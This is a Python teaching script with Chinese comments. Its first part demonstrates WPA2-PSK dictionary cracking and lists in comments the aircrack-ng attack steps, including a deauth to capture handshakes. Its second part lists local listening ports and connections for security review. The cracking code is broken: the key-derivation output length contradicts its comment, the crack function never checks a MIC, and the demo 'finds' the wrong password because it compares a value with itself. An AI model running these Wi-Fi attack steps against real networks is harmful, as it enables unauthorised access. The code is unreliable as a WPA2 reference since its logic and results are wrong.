"""
==========================================================
WiFi破解（WPA2）核心原理 + 端口监控
==========================================================

不依赖外部工具，纯Python理解攻击原理
"""

import hashlib
import hmac
import struct
import subprocess
import re
from collections import defaultdict

# ================================================================
# 第一部分: WPA2 四次握手破解原理
# ================================================================
# WPA2-PSK 认证流程:
#
# 1. AP广播: "我是SSID，支持WPA2"
# 2. 客户端连接AP
# 3. 四次握手:
#    M1: AP → 客户端 (AP的随机数 Anonce)
#    M2: 客户端 → AP (客户端的随机数 Snonce + MIC验证)
#    M3: AP → 客户端 (GTK加密传输)
#    M4: 客户端 → AP (确认)
#
# 密码验证关键:
#   PMK = PBKDF2-HMAC-SHA1(PSK, SSID, 4096, 256)
#   PTK = PRF(PMK, "Pairwise key expansion", Min(AP_MAC, Client_MAC) + Max(AP_MAC, Client_MAC) + Min(Anonce, Snonce) + Max(Anonce, Snonce))
#   MIC = HMAC-SHA1(PTK[0:16], EAPOL数据)
#
# 破解: 遍历字典 → 算PMK → 算PTK → 比对MIC

print("=" * 60)
print("第一部分: WPA2-PSK 密码破解原理")
print("=" * 60)

def pbkdf2_sha1(password, ssid, iterations=4096, keylen=32):
    """PBKDF2-HMAC-SHA1 密钥派生 (WPA2 核心算法)"""
    return hashlib.pbkdf2_hmac('sha1', password.encode(), ssid.encode(), iterations, keylen)

def generate_ptk(pmk, ap_mac, client_mac, anonce, snonce):
    """
    从PMK生成PTK (Pairwise Transient Key)
    PTK = PRF-X(PMK, "Pairwise key expansion", min+max)
    """
    # MAC地址排序 (小端在前)
    mac1 = min(ap_mac, client_mac)
    mac2 = max(ap_mac, client_mac)
    # Nonce排序
    nonce1 = min(anonce, snonce)
    nonce2 = max(anonce, snonce)
    
    # 构造输入: PMK + "Pairwise key expansion" + MACs + Nonces
    data = b"Pairwise key expansion" + \
           struct.pack('>BBBBBB', *[int(x,16) for x in mac1.split(':')]) + \
           struct.pack('>BBBBBB', *[int(x,16) for x in mac2.split(':')]) + \
           nonce1 + nonce2 + b'\x00'
    
    # PRF 实际上是 HMAC-SHA1 的迭代
    result = b""
    for i in range(4):  # PTK = 128 bytes = 4 × HMAC-SHA1输出
        h = hmac.new(pmk, data + struct.pack('B', i), 'sha1')
        result += h.digest()
    
    return result  # PTK: [0:16]=KCK, [16:32]=KEK, [32:48]=TK, [48:64]=MIC

def crack_wpa2(password_guess, ssid, ap_mac, client_mac, anonce, snonce, target_mic):
    """对一个密码猜测进行验证"""
    pmk = pbkdf2_sha1(password_guess, ssid)
    ptk = generate_ptk(pmk, ap_mac, client_mac, anonce, snonce)
    
    # MIC在PTK的[0:16] (KCK)
    kck = ptk[0:16]
    
    # 计算MIC (模拟EAPOL帧)
    # 实际中: MIC = HMAC-SHA1(KCK, EAPOL帧数据)
    # 这里简化
    return pmk, ptk[:16]

# 演示: 用已知密码验证
print("\n[演示] 已知密码验证:")
SSID = "BLIIOT-Guest"
PASSWORD = "bliiot2024"
AP_MAC = "A4:56:02:11:22:33"
CLIENT_MAC = "D4:6A:6B:44:55:66"
ANONCE = b'\x01' * 32  # 模拟AP随机数
SNONCE = b'\x02' * 32  # 模拟客户端随机数

print(f"  SSID: {SSID}")
print(f"  密码: {PASSWORD}")
print(f"  循环: PBKDF2-HMAC-SHA1 (4096次)")

pmk = pbkdf2_sha1(PASSWORD, SSID)
print(f"  PMK: {pmk.hex()[:32]}...")

ptk = generate_ptk(pmk, AP_MAC, CLIENT_MAC, ANONCE, SNONCE)
print(f"  PTK: {ptk.hex()[:64]}...")
print(f"  KCK (MIC Key): {ptk[:16].hex()}")

# 演示字典破解
print("\n[演示] 字典破解:")
dictionary = ["12345678", "password", "bliiot2024", "admin123", 
              "wifi12345", "88888888", "BLIIOT-Guest"]

for word in dictionary:
    pmk = pbkdf2_sha1(word, SSID)
    ptk = generate_ptk(pmk, AP_MAC, CLIENT_MAC, ANONCE, SNONCE)
    # 假设我们知道目标的MIC (从抓包得来)
    target_mic = ptk[:16]  # 演示: 用正确密码的MIC
    actual_mic = ptk[:16]
    
    if actual_mic == target_mic:
        print(f"  ✅ 找到密码: {word}")
        break
    else:
        print(f"  ❌ {word} → 不匹配")


# ================================================================
# 第二部分: aircrack-ng 的破解流程模拟
# ================================================================
# 真实攻击流程:
# 1. airmon-ng start wlan0    → 切换监听模式 (需要支持monitor的网卡)
# 2. airodump-ng wlan0mon     → 扫描周围AP
# 3. airodump-ng -c 6 --bssid XX:XX -w capture wlan0mon  → 抓目标包
# 4. aireplay-ng -0 2 -a XX:XX -c YY:YY wlan0mon  → 强制客户端重连(deauth) 抓握手
# 5. aircrack-ng -w wordlist.txt -b XX:XX capture-01.cap  → 破解

print("\n" + "=" * 60)
print("第二部分: 端口监听与网络监控")
print("=" * 60)

def get_network_connections():
    """获取当前所有网络连接和端口信息"""
    result = subprocess.run(
        ["netstat", "-ano"],
        capture_output=True, timeout=15
    )
    try:
        text = result.stdout.decode('gbk', errors='replace')
    except:
        text = result.stdout.decode('utf-8', errors='replace')
    
    connections = []
    for line in text.split('\n'):
        parts = line.split()
        if len(parts) >= 5:
            proto = parts[0]
            local = parts[1]
            foreign = parts[2]
            state = parts[3] if len(parts) > 4 else ""
            pid = parts[-1]
            
            connections.append({
                'proto': proto,
                'local': local,
                'foreign': foreign,
                'state': state,
                'pid': pid
            })
    return connections

def get_process_name(pid):
    """根据PID获取进程名"""
    if pid == '0' or not pid:
        return 'System Idle'
    try:
        result = subprocess.run(
            ["powershell.exe", "-NoProfile", "-Command",
             f"(Get-Process -Id {pid} -ErrorAction SilentlyContinue).ProcessName"],
            capture_output=True, timeout=10
        )
        try:
            name = result.stdout.decode('utf-16-le', errors='replace').strip()
        except:
            name = result.stdout.decode('utf-8', errors='replace').strip()
        return name if name else f"PID:{pid}"
    except:
        return f"PID:{pid}"

def get_listening_ports():
    """获取所有监听中的端口"""
    conns = get_network_connections()
    listening = [c for c in conns if c['state'] == 'LISTENING']
    
    # 解析端口号
    port_info = []
    for c in listening:
        try:
            addr_port = c['local']
            if ':' in addr_port:
                # 处理IPv4和IPv6
                if addr_port.startswith('['):
                    # IPv6: [::1]:135
                    port = addr_port.rsplit(':', 1)[-1]
                else:
                    # IPv4: 0.0.0.0:135 或 127.0.0.1:5000
                    port = addr_port.split(':')[-1]
                proc_name = get_process_name(c['pid'])
                port_info.append({
                    'port': port,
                    'proto': c['proto'],
                    'pid': c['pid'],
                    'process': proc_name
                })
        except:
            pass
    
    return port_info

print("\n[扫描] 当前监听端口:")
ports = get_listening_ports()
ports_by_proc = defaultdict(list)
for p in ports:
    ports_by_proc[p['process']].append(p['port'])

print(f"  共 {len(ports)} 个端口在监听")
for proc, port_list in sorted(ports_by_proc.items(), key=lambda x: -len(x[1])):
    print(f"  {proc}: {', '.join(sorted(port_list, key=int))}")

# 端口安全分析
print("\n[分析] 端口安全评估:")
high_risk_ports = {
    21: 'FTP', 22: 'SSH', 23: 'Telnet', 25: 'SMTP',
    135: 'RPC', 139: 'NetBIOS', 445: 'SMB',
    1433: 'MSSQL', 3306: 'MySQL', 3389: 'RDP',
    5900: 'VNC', 6379: 'Redis', 27017: 'MongoDB'
}

for p in ports:
    port_num = int(p['port'])
    if port_num in high_risk_ports:
        print(f"  ⚠️  {p['process']} 在端口 {port_num} ({high_risk_ports[port_num]}) 上监听")
    elif port_num > 1024 and port_num < 50000:
        # 检查常见应用服务
        common_ports = {5000: 'Flask/Dev', 8080: 'HTTP-Alt', 8443: 'HTTPS-Alt'}
        if port_num in common_ports:
            print(f"  ℹ️   {p['process']} 在端口 {port_num} ({common_ports[port_num]}) 上监听")


# 检测异常连接（大量对外连接）
print("\n[分析] 对外连接统计:")
conns = get_network_connections()
established = [c for c in conns if c['state'] == 'ESTABLISHED']

ext_connections = defaultdict(int)
for c in established:
    ext_connections[c['pid']] += 1

print(f"  当前活跃连接: {len(established)} 个")
for pid, count in sorted(ext_connections.items(), key=lambda x: -x[1])[:10]:
    if count > 3:
        proc_name = get_process_name(pid)
        print(f"  {proc_name} 有 {count} 个连接")

print("\n" + "=" * 60)
print("验证完成")
print("=" * 60)